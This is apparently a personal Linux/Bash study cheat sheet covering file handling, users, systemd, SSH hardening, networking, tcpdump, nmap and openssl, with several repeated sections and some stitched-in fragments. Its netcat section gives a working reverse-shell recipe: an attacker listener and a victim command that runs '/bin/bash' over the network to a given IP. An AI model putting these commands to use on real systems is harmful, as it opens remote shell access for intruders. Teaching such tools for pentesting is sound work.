# Linux Bash Commands Cheat Sheet

> A simplified, structured guide for essential Linux and Bash commands, with selectable code blocks.

---

## ℹ️ Get Command Help

```bash
man command_name
whatis command_name
command_name --help
```

---

## 🌍 Navigating the System

```bash
cd /          # Go to root directory
cd            # Go to home directory
pwd           # Show current directory
whoami        # Show current user
```

```bash
ls -l         # List with details
ls -ltr       # List by time, reverse
ls -la        # Include hidden files
```

---

## 📂 File and Directory Management

```bash
touch file.txt                # Create file
mkdir folder_name             # Create directory
rm file.txt                   # Remove file
rm -r folder_name             # Remove directory recursively
cp file1.txt file2.txt        # Copy file
mv file1.txt file2.txt        # Move/rename
```

```bash
echo "Hello World" > file.txt # Write to file
cat file.txt                  # Display file content
```

---

## 🔗 File Links
Each time you create a file, the OS assign a number to that file on a hard disk, called inode (pointer or number). Creating a soft link to a file (soft link --> file --> inode) soft link is like a shortcut in Windows

```bash
ln -s file_name link_name     # Create soft link (shortcut)
ln file_name link_name        # Create hard link (same inode)
```

> ⚠️ Hard links must be created on the same partition.

```bash
ls -li                        # List with inode numbers
```

---

## ↔️ Input/Output Redirection

- Input and Output redirects: stdin, stdout, sdterro whith file descriptor number 0,1,2  
- By default, when running a command its output goes to the terminal. 
- OUTPUT of a command can be routed to a file using > symbol

```bash
command > output.txt          # Redirect output (overwrite)
command >> output.txt         # Redirect output (append)
command < input.txt           # Redirect input
```

---

## 🔗 Piping Commands

```bash
ls -ltr | more                # Paginate output
ls -l | tail                  # Show last lines
```

---

## ✏️ Text Search

```bash
grep "word" file.txt
grep -i "word" file.txt       # Case insensitive
```

---

## ✍️ File Editors: `vi` / `vim`

- `i` to insert text
- `ESC` to return to command mode
- `/word` to search, `n` for next match
- `dd` delete line, `u` undo, `x` delete char
- `:wq` or `Shift + ZZ` to save & quit
- `r<char>` replace one character
- `o` create new line below

---

## 🤵 Users and Groups (Root Required)

Records of users are maintained in 3 different files: /etc/passwd, /etc/group, /etc/shadow



```bash
useradd -m username               # Add user with home directory
groupadd groupname                # Add group
usermod -G groupname username     # Add user to group
passwd username                   # Set password

id user_name # to check uid gid
useradd hulk # in RH distribution the -m is automatically added
useradd -m hulk # to ensure the user directory is created in /home
# automatically create a group of the same user name
groupadd superheroes
usermod -G superheroes hulk #hulk belongs also to group superheroes (as well as hulk group)
cat hulk /etc/group # or better below
grep hulk /etc/group # to retrieve directly hulk in the file
chgroup -R superheroes hulk # move hulk to the group superheroes only
#to avoid these problems, type at the user hulk creation
useradd -g superheroes -s /bin/bash -m hulk

```

```bash
grep username /etc/group          # Check groups
chgrp group_name file_name  
chown group_name file_name  
chown group_name:group_name file_name  

```

---

## ⚡ Password Rules & Expiry

- rules of rotation for user's password
- chage command used to change or view the password expiration settings for a user account
- /etc/login.defs is very important, and contains settings for password rotations of all users 

```bash
chage username                    # Set password expiry rules
```

Config file: `/etc/login.defs`

---

## 🤷 Switching Users & Sudo

```bash
su - username
sudo command
visudo                         # Edit sudoers file
```

---

## 📄 File Permissions

```bash
chmod u+x file.txt               # Add execute to user
chmod g-w file.txt               # Remove write from group
chmod o+r file.txt               # Add read to others
```

```bash
chown user file.txt
chgrp group file.txt
```

---

## 🚀 Processes & Jobs

- **Application / Service**: A program you run on your machine, such as `NTP`, `NFS`, `Apache`, or `rsyslog`.

- **Script / Shell Commands**: A sequence of commands (like `adduser`, `cd`, `pwd`) saved in a `.sh` file and executed by a shell like Bash.

- **Process**: An instance of a running application. Each process has its own memory, resources, and process ID (PID). Processes are isolated from each other.

- **Daemon**: A background process that runs continuously without user interaction (e.g., `cron`, `sshd`).

- **Thread**: A lightweight execution unit within a process. Multiple threads can run inside a single process and share its memory.

- **Job**: A scheduled task (e.g., from `cron`) that automates the execution of a script or service at specific intervals.

```bash
top                             # Live process monitor
ps -ef                          # Process snapshot
ps -ef | grep app               # Find specific process
kill PID                        # Kill a process
kill -9 PID                     # Force kill
```

---

## 🔄 Services & Daemons

- Every time you install an application or a package or a service in your linux environment, then you could control that program running command systemctl.  

- systemd is a system and service manager that has become the default init system in many Linux distributions  

- It is responsible for starting and managing services, controlling the boot process, and maintaining system state

- The init system is the first process that gets executed on the system and has the process ID (PID) of 1. It is responsible for starting all other processes and managing the system's resources.





```bash
# check if systemd is running
ps -ef | grep system

# check all running services
systemctl --all

# check status of a service (application = name of the service)
systemctl status application.service
systemctl statuts firewalld.service

ps -ef | grep firewalld 

#Check the status, start, stop and restart an application/service
systemctl status|start|stop|restart application.service
systemctl stop firewalld.service # best way to stop a service, better than killing the service

# to relod configuration of a service
systemctl reload application.service

# to restart after changing some configuration: use restart application.service
# enable or disable a service at boot time
systemctl enable|disable application.service

# Specific to Red Hat: Red Hat Package Manager rpm, q = query, a = all
rpm -qa # list all packages on the system

systemctl status app.service    # Check status
systemctl start|stop|restart app.service
systemctl enable|disable app.service
```

```bash
ps -ef | grep systemd           # Check systemd
```


## CONFIGURE AND SECURE SSH

Open SSH is a package/software usually pre-installed in Linux Distributions, runs on port 22. Its service daemon is sshd
SSH itself is secure, communication through SSH is always encrypted. But needs a little configuration by an administrator to secure better

```bash
man sshd_config

# become root, and edit your /etc/ssh/sshd_config file, copy it (backup), open sshd_config with vi

# Configure Idle Timeout Interval
# go to the end of the file with shift + P then add the following lines:
# ClientAliveInterval 600 # 600 means 600s = 10 minutes once this interval has passed, the idle user will be automatically logged out
# ClientAliveCountMax 0
systemctl restart sshd

# Disable root login for any user
# replace PermitRootLogin yes to no
systemctl restart sshd 

# Disable empty password
# remove # from the following line
# PermitEmptyPAsswords no
systemctl restart sshd


# Limit User's SSH Access: to provide another layer of security, you should limit your SSH login to only certain users who need remote access
# add line: AllowUsers user1 user2
systemctl restart sshd

# Use a different port: by default SSH runs on 22, so most hackers looking for any open SSH servers will look for port 22 and 
#  changing can make system much more secure
# remove # from the following line and change port number
# Port 22
systemctl restart sshd


# Access remote linux server without password (avoid repetitive logins, automation through scripts)
# keys are generated at user or root level
# SSH to an Amazon Linux instance for example
# generate kyes on your client (local machine) and copy over the keys from client to server (AWS), then SSH
# different from SSH with username and password

```


---

## 📊 Disk and Memory

```bash
df -h                            # Disk usage
du -k / | sort -nr | more        # Largest folders
free                             # Memory usage
df, df -h, df -T
du # disk usage of each file of the system
du -k directory_name | sort -nr | more  # sort reverse order
top # dynamic real-time process monitor

```


## 💾 Memory & Open Files

### Check Memory Usage

```bash
free                          # Displays system memory usage (RAM)
```

> When physical memory is fully utilized, the OS moves less-used data to disk — this is called **swapping** or **paging**.

---

### List Open Files with `lsof`

```bash
lsof                          # List all open files
lsof -i                       # Show open network connections
lsof -p <PID>                 # Files opened by specific process ID
lsof -u <username>            # Files opened by a specific user
lsof -c <command>             # Files opened by specific command
lsof -t                       # Print only process IDs
```

> Useful for debugging file locks, tracking resources, and monitoring open connections.


---

## 📁 Open Files & Ports

```bash
lsof -i                          # Open network files
lsof -p <PID>                    # Files by process
lsof -u <user>                   # Files by user
```

---

## 🚨 Network Tools

```bash
ifconfig                         # Interface info
hostname -I                     # Local IP
netstat -rnv                    # Routing table
netstat -at|au                  # TCP/UDP connections
ping hostname
traceroute google.com
dig google.com
```

---

## 🚀 TCPDUMP (Sniffing)

```bash
tcpdump -i enp0s3                # Monitor interface
tcpdump port 80
tcpdump -i eth0 > capture.pcap   # Save traffic to file
```

---

## ⚙ Configure SSH

Edit `/etc/ssh/sshd_config`, then:

```bash
systemctl restart sshd           # Restart SSH service
```

Examples:
```bash
# Set idle timeout:
ClientAliveInterval 600
ClientAliveCountMax 0

# Disable root login:
PermitRootLogin no

# Only allow certain users:
AllowUsers user1 user2

# Change default port:
Port 2222
```

---

## 🔐 SSH Keys (Passwordless Login)

```bash
ssh-keygen                        # Generate key
ssh-copy-id user@ip_address      # Copy key to remote
ssh user@ip_address              # Login
```

---

## 📂 Log Files

```bash
cd /var/log
more boot.log                    # View boot logs
```

Other logs: `secure`, `messages`, `dmesg`, `maillog`, etc.

---

## ⚖️ Linux Network Configuration
- DHCP = Dynamic Host Control Protocol
- Static IP vs DHCP
- Static IP does not change: meaning you reboot, reconfigure, shut down for a month your computer, does not change
- Dynamic IP: change every time your computer reboot
- Static IP for computer/servers that have hostname IP assignment as a DNS set up
- Network Card give you network interface, software which enable you to connect to the internet or other computers
- OS network components: network interface, MAC address (associated to network interface, never change), subnet mask (give your IP allowed range)
- Gateway is an IP associated to your router which allows you to take traffic from your computer to other computers
- MAC addres is like: ether 02:05:85:7f:eb:80  it is assigned by manufacturer when your ethernet card is built


```bash
ifconfig
ip addr show wifi_device_name
ip address show device_name
hostname -I
netstat -a
netstat -rnv # allows to find your Gateway IP address
nslookup www.google.com # allows you to find your DNS server address
```

### Specific to RH/CentOS distributions
- NetworkManager is the default network management service on RHEL 8 & 9
- to install on another distribution, command $sudo apt install network-manager

```bash
systemctl status NetworkManager
ps -ef | grep Network
# every time you make changes to your network, restart your network manager with
systemctl restart NetworkManager
```

### Folder location to know as an RH administrator

# To know files as a RH Admin
```bash
/etc/sysconfig/network-scripts # contain config file of enp0s3, you can add other with ifup command
/etc/hosts # 
/etc/hostname # contains info of hostname
/etc/resolv.conf # contains info for your DNS (IP of your computer)
/etc/nsswitch.conf
```

### A great tool: nmcli
```bash
nmcli                            # Network CLI
nmcli device
nmcli connection show
systemctl restart NetworkManager
```

```bash
# Assign static IP
nmcli connection modify enp0s3 ipv4.addresses 192.168.1.10/24
nmcli connection modify enp0s3 ipv4.gateway 192.168.1.1
nmcli connection modify enp0s3 ipv4.method manual
nmcli connection up enp0s3
```

---

## 📃 System Files (RHEL)

- `/etc/hosts` → Static hostname lookups  
- `/etc/hostname` → Current hostname  
- `/etc/resolv.conf` → DNS config  
- `/etc/sysconfig/network-scripts/` → Interface scripts

---

## ✅ Essential RHCSA Commands

```bash
ping
ping localhost
ping host_name
ifconfig
ip
ifup eth0
ifdown eth0
netstat
traceroute
nslookup
dig
tcpdump -i your_device_name (eg enp0s3)
```

---

## ℹ️ Get Command Help

```bash
man command_name
whatis command_name
command_name --help
```

---

## 🌍 Navigating the System

```bash
cd /          # Go to root directory
cd            # Go to home directory
pwd           # Show current directory
whoami        # Show current user
```

```bash
ls -l         # List with details
ls -ltr       # List by time, reverse
ls -la        # Include hidden files
```

---

## 📂 File and Directory Management

```bash
touch file.txt                # Create file
mkdir folder_name             # Create directory
rm file.txt                   # Remove file
rm -r folder_name             # Remove directory recursively
cp file1.txt file2.txt        # Copy file
mv file1.txt file2.txt        # Move/rename
```

```bash
echo "Hello World" > file.txt # Write to file
cat file.txt                  # Display file content
```

---

## 🔗 File Links

> **Soft vs Hard Links**: 
> - A **soft link** (symbolic link) is like a shortcut; it points to the path of a file.
> - A **hard link** directly references the file's inode, making it another entry point to the same data.
> - Hard links must exist on the same partition as the original file.


```bash
ln -s file_name link_name     # Create symbolic (soft) link to a file
ln file_name link_name        # Create hard link (points to same inode)
ls -li                        # List files with inode numbers
```

> ⚠️ Hard links must be created on the same partition.

---

## ↔️ Input/Output Redirection

> **Redirection** allows you to control where input comes from (stdin) and where output goes (stdout or stderr). Useful for saving output or automating tasks.

```bash
command > output.txt          # Redirect standard output to a file (overwrite)
command >> output.txt         # Append output to file (preserve content)
command < input.txt           # Use a file as input for the command
```

---

## 🔗 Piping Commands

> **Pipes (`|`)** let you pass the output of one command directly as input to another — great for chaining commands and filtering output.

```bash
ls -ltr | more                # View long listing one screen at a time
ls -l | tail                  # Show only the last lines of output
```

---

## 🔎 Regular Expressions & `grep`

> **Regular Expressions (Regex)** are powerful patterns used to search, match, and manipulate text. Combined with commands like `grep`, they allow you to extract or filter lines in files based on complex criteria.

> `grep` is a command-line tool used to search for patterns in text. `egrep` (or `grep -E`) supports extended regex syntax.


```bash
grep "word" file.txt           # Search for 'word' in a file
grep -i "word" file.txt        # Case-insensitive match
grep -v "word" file.txt        # Exclude lines containing 'word'
grep -n "word" file.txt        # Show line numbers with matches
grep -c "word" file.txt        # Count matching lines
egrep -i "cat|dog" file.txt    # Match 'cat' or 'dog' (OR condition)
```

**Regex Examples** (with short descriptions):

- `[aeiou]` → vowels
- `a+` → one or more "a"
- `cat|dog` → matches either
- `.*world` → ends with "world"
- `^start` → starts with "start"
- `$end` → ends with "end"
- `\d` → any digit
- `(abc)+` → repeated "abc"

**Date Matching Patterns**:

```regex
\d{4}-\d{2}-\d{2}       # YYYY-MM-DD
\d{2}/\d{2}/\d{4}       # MM/DD/YYYY
\d{2}\.\d{2}\.\d{4}     # DD.MM.YYYY
([A-Za-z]+) \d{1,2}, \d{4} # Month Day, Year
```

**Additional Pattern Examples**:

```regex
\b[A-Za-z]{5}\b       # 5-letter words
^north                 # Starts with "north"
0$                     # Ends with 0
[we].st                # Matches west, e.g.
```

---

## 🕒 Scheduling Tasks with `crontab`

```bash
crontab -e                   # Edit user cronjobs
crontab -l                   # List user cronjobs
man crontab                  # Manual
man 5 crontab                # Syntax
```

**Cron format**:

```
* * * * * /path/to/command.sh
| | | | |
| | | | +----- Day of week (0-6 or Sun-Sat)
| | | +------- Month (1-12 or Jan-Dec)
| | +--------- Day of month (1-31)
| +----------- Hour (0-23)
+------------- Minute (0-59)
```

**Examples**:

```bash
*/2 * * * * date >> /home/user/log_date.txt
0 0 * * * /script.sh >> logfile.log 2>&1
```

```bash
ls /etc/cron.d
ls /etc/cron.daily
ls /etc/cron.weekly
cat /etc/crontab
```

> Add `SHELL=/bin/bash` to use Bash inside cron

---

## 🧠 Concepts: Applications, Scripts, Processes, and More

> This section breaks down essential system-level components in Linux: what applications and processes are, how scripts work, and how the OS manages background services, threads, and scheduled jobs.

- **Application / Service**: A user-facing or background-running program such as `NTP`, `Apache`, or `rsyslog`. These can provide system functionality or host services.
, such as `NTP`, `NFS`, `Apache`, or `rsyslog`.

- **Script / Shell Commands**: A text file containing shell commands (e.g., `adduser`, `cd`, `pwd`) — usually stored in `.sh` files — and executed sequentially by a shell like Bash.
 (like `adduser`, `cd`, `pwd`) saved in a `.sh` file and executed by a shell like Bash.

- **Process**: When you start an application, the OS spawns a process with its own memory and Process ID (PID). Processes are isolated and cannot access each other's memory directly.
. Each process has its own memory, resources, and process ID (PID). Processes are isolated from each other.

- **Daemon**: A special kind of process that runs continuously in the background, often started at boot time — e.g., `cron`, `sshd`, `systemd`.
 that runs continuously without user interaction (e.g., `cron`, `sshd`).

- **Thread**: A smaller execution unit inside a process. Threads within the same process share memory and resources, enabling parallelism (e.g., multithreaded servers).
 within a process. Multiple threads can run inside a single process and share its memory.

- **Job**: A time- or event-based task created by a scheduler like `cron`. It runs applications, scripts, or commands at defined intervals.
 (e.g., from `cron`) that automates the execution of a script or service at specific intervals.

---

## 💾 Memory & Open Files

> This section covers tools to monitor and debug memory usage and file or network resource consumption on your system.

### Check Memory Usage

```bash
free                          # Displays system memory usage (RAM)
```

> **Swapping** (or paging) is a memory management mechanism used when your physical RAM is full. The OS moves inactive pages of memory to a reserved space on the hard disk called swap space. 
> 
> This ensures the system keeps running smoothly under heavy load, though it results in slower performance because disk access is significantly slower than RAM. To monitor swap usage in real time, you can use `top` or `vmstat`.

```bash
top                           # Live memory/swap/process monitor
vmstat 1                      # Show memory, swap, I/O and CPU usage (updates every 1 sec)
```

> When physical memory (RAM) is fully utilized, the OS transfers less frequently used data from RAM to disk space called **swap**. This process, known as **swapping** or **paging**, allows the system to continue operating even when memory is tight—though it comes at the cost of slower performance, as disk access is much slower than RAM.

---

### List Open Files with `lsof`

```bash
lsof                          # List all open files
lsof -i                       # Show open network connections
lsof -p <PID>                 # Files opened by specific process ID
lsof -u <username>            # Files opened by a specific user
lsof -c <command>             # Files opened by specific command
lsof -t                       # Print only process IDs
```

> Useful for debugging file locks, tracking resources, and monitoring open connections.

---

## 🌐 Networking Tools

> This section covers common Linux networking commands to inspect interfaces, test connectivity, trace routes, and monitor ports and sockets.

---

### 🧭 Visual Map of Network Communication

```text
+------------+       ping/traceroute        +------------+
|  Your Host | ---------------------------> |  Remote IP |
| (192.168.1.5)                             | (e.g. 8.8.8.8) |
+------------+                             +------------+
       |                                          ^
       | DNS Lookup (nslookup/dig)               |
       v                                          |
   [DNS Server] <-------------------------[Network Routing]
```

---

> This section covers common Linux networking commands to inspect interfaces, test connectivity, trace routes, and monitor ports and sockets.

```bash
ifconfig                     # View current network interface configuration (deprecated on newer distros)
ip a                        # Modern replacement for ifconfig
ip a show dev eth0          # Show info for specific interface
```

```bash
hostname -I                 # Show IP address(es) assigned to the host
ping google.com             # Test reachability to a remote server
traceroute google.com       # Trace route to destination (requires package)
nslookup google.com         # Get DNS resolution info
dig google.com              # Alternative DNS query tool (requires bind-utils)
```

### Monitor Network Connections and Routing

```bash
netstat -tuln               # List all listening ports (TCP/UDP) with numbers
netstat -rn                 # Show routing table
ss -tuln                    # Modern replacement for netstat
```

### Inspect Live Traffic

> `tcpdump` is a powerful command-line packet analyzer that captures and displays network packets in real-time. It’s ideal for debugging, monitoring, or analyzing network activity.

```bash
tcpdump -i eth0                        # Capture packets on eth0
sudo tcpdump -nn -v                    # Show numeric addresses/ports, verbose output
tcpdump -n -i eth0 port 443            # Only capture HTTPS traffic
sudo tcpdump -A -i eth0                # Show packet contents in ASCII
sudo tcpdump -s 0 -i eth0              # Capture full packets, not just headers
tcpdump -w capture.pcap                # Write capture to file (for Wireshark)
tcpdump -r capture.pcap                # Read and analyze saved capture
```

> ℹ️ You can open `.pcap` files using tools like **Wireshark** for a graphical interface.

```bash
tcpdump -i eth0             # Monitor packets on interface eth0
tcpdump port 80             # Filter traffic on port 80
tcpdump -w file.pcap        # Save capture to file (for Wireshark analysis)
```

---

### 🔬 Analyze Captured Traffic with Wireshark

> **Wireshark** is a GUI-based packet analysis tool that lets you deeply inspect protocol traffic, filter by port or IP, and visualize communication flows. Use it in combination with `tcpdump`:

```bash
sudo tcpdump -i eth0 -w capture.pcap  # Save raw packets
wireshark capture.pcap                # Open in GUI (requires X11/GUI environment)
```

> Filters in Wireshark can help isolate traffic types, such as:
- `ip.addr == 192.168.1.10`
- `tcp.port == 443`
- `http.request.method == "GET"`

---

## 🔧 Network Diagnostics with `netcat` and `nmap`

### `netcat` (nc) – The Swiss Army Knife of Networking

`netcat` (or `nc`) can be used to test ports, transfer files, and even create basic chat or reverse shells.

```bash
nc -zv 192.168.1.10 22         # Check if SSH port is open on a remote host
nc -l -p 1234                  # Start a TCP listener on port 1234
nc 192.168.1.10 1234           # Connect to a listener
```

> 📦 You can also transfer files:
```bash
# On receiving machine:
nc -l -p 4444 > received.txt

# On sending machine:
nc 192.168.1.10 4444 < file.txt
```

---

### Reverse Shell with `netcat`

> 🧬 **Diagram: How a Reverse Shell Works**
>
```text
+----------------+        Connects to       +------------------+
|   Victim Host  | -----------------------> |  Attacker (nc -l) |
| nc attacker_ip |                          |   Listening Shell |
+----------------+                          +------------------+
       ^                                               |
       |  Executes /bin/bash over the network          |
       +-----------------------------------------------+
```


> A reverse shell allows a target machine to connect back to the attacker's listener and give shell access. This is often used in pentesting.

```bash
# Attacker (listening for connection):
nc -lvnp 4444

# Victim (connects to attacker and gives shell):
nc 192.168.1.5 4444 -e /bin/bash
```

> ⚠️ This only works with traditional `netcat`. Some versions (like `ncat`) use different flags. Ensure it supports `-e`.

---

### `nmap` – Network Scanner & Security Tool

> `nmap` is a powerful network scanning tool used to discover hosts and services on a network.

```bash
nmap 192.168.1.1                 # Scan a single IP
nmap 192.168.1.0/24              # Scan a subnet
nmap -p 22,80,443 192.168.1.10   # Scan specific ports
nmap -sV -A 192.168.1.10         # Detect OS and running services
```

> 🔍 Use `nmap` to detect live hosts, open ports, and service versions. Great for recon and troubleshooting.

---

### 🧾 `nc` vs `ncat` Feature Comparison

| Feature                 | `nc` (netcat)         | `ncat` (from Nmap)       |
|------------------------|------------------------|---------------------------|
| Basic TCP/UDP I/O      | ✅ Yes                 | ✅ Yes                    |
| File Transfer          | ✅ Yes                 | ✅ Yes                    |
| Listen Mode            | ✅ Yes (`-l`)          | ✅ Yes                    |
| Execute Program (`-e`) | ✅ Yes (in traditional)| ❌ Disabled for security   |
| SSL Support            | ❌ No                  | ✅ Yes (`--ssl`)           |
| IPv6 Support           | ⚠️ Varies              | ✅ Yes                    |
| Built-in with Nmap     | ❌ No                  | ✅ Yes                    |

> ✅ Use `ncat` when you need encryption or Nmap integration.  
> ⚠️ Use traditional `nc` for reverse shells (ensure `-e` is supported).

---

## 🧪 Miscellaneous Tools


### Base 64

```bash
echo "string" | base64;
echo "string" | base64 --decode; echo
```


### Configure pip with Nexus

**pip.conf (Linux/macOS)**:

```ini
[global]
index-url = https://your-nexus-url/repository/pypi-proxy/simple
trusted-host = your-nexus-url
cert = /path/to/cert.pem
```

**Environment Variables**:

```bash
export NEXUS_USERNAME=my_user
export NEXUS_PASSWORD=my_pass
```

Add to `~/.bashrc` and run `source ~/.bashrc`

**Check Config**:

```bash
pip config debug
pip show package-name
pip -v search package-name
```

**Windows Config (pip.ini)**: Location: `C:\Users\YourName\AppData\Roaming\pip\pip.ini`

```ini
[global]
index-url = https://nexus-server/repository/simple
trusted-host = nexus-server
cert = C:\Users\username\AppData\Roaming\pip\nexus.pem
```

```cmd
setx NEXUS_USERNAME your_username
setx NEXUS_PASSWORD your_password
```

---

## 🔁 PO to MO File Conversion

```bash
msgfmt -o output.mo input.po
```

---

## 🔐 Create a Self-Signed SSL Certificate

```bash
# Generate Private Key
openssl genpkey -algorithm RSA -out private-key.pem

# Create CSR (optional if self-signed)
openssl req -new -key private-key.pem -out csr.pem

# Generate Certificate
openssl req -x509 -key private-key.pem -in csr.pem -out certificate.pem

# Encrypt Private Key
openssl rsa -aes256 -in private-key.pem -out encrypted-private-key.pem
```

> Self-signed certificates are good for testing. For production, use a trusted Certificate Authority (CA).

